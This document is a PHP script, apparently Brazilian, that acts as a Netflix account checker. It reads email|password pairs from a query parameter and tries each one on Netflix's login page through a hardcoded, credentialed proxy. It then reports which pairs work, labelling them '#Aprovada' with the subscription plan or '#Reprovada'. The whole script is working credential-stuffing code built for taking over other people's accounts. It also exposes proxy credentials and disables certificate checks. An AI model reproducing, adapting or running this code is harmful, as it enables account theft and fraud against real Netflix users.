
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 
 
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email  = $separar[0];
$senha = $separar[1];
 
 
$username = 'blue3419ankj16047'; 
$password = 'ku9VsvUjT7gv7oOx_country-Brazil'; 
$proxy = 'isp2.hydraproxy.com:9989';



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.netflix.com/br/login');
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d1 = curl_exec($ch);
//token authURL
$authURL = getStr($d1, '<input type="hidden" name="authURL" value="', '"/>'); 
//all set-cookies
$flwssn = getStr($d1, 'set-cookie: flwssn=', ';');
$clSharedContext = getStr($d1, 'set-cookie: clSharedContext=', ';');
$nfvdid = getStr($d1, 'set-cookie: nfvdid=', ';');
$SecureNetflixId = getStr($d1, 'set-cookie: SecureNetflixId=', ';');
$NetflixId = getStr($d1, 'set-cookie: NetflixId=', ';');
$memclid = getStr($d1, 'set-cookie: memclid=', ';');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.netflix.com/br/login');  	
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: www.netflix.com',
  'Connection: keep-alive',
  'Cache-Control: max-age=0',
  'Upgrade-Insecure-Requests: 1',
  'Origin: https://www.netflix.com',
  'Content-Type: application/x-www-form-urlencoded',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'Referer: https://www.netflix.com/br/login',
  'Accept-Encoding: gzip, deflate, br',
  'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
	));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'userLoginId='.trim(urlencode($email)).'&password='.trim(urlencode($senha)).'&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode&authURL='.trim(urlencode($authURL)).'&nextPage=&showPassword=&countryCode=%2B55&countryIsoCode=BR');
$data = curl_exec($ch);
//$incorreta = getStr($data, '<div data-uia="text" class="ui-message-contents"><b>', '</b>');
include('simple_html_dom.php');
$html = str_get_html($data);
$es = $html->find('div[class="ui-message-contents"]', 1);
$es = str_replace(array("\r", "\n"), '', $es);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.netflix.com/YourAccount');
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: www.netflix.com',
  'Connection: keep-alive',
  'Cache-Control: max-age=0',
  'Upgrade-Insecure-Requests: 1',
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64; MuMu 6.0.1 Build/V417IR) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Encoding: gzip, deflate',
  'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d2 = curl_exec($ch);
$plano = getStr($d2, '<div class="account-section-item" data-uia="plan-label"><b>', '</b>');





     if(stristr($d2,'DETALHES DO PLANO') !== false){
        echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.'<strong> Plano: '.$plano.'</strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }
	
else{
        echo '               
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' -> Info: '.$es.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';

}

curl_close($ch);
 ob_flush();        
                             
?>
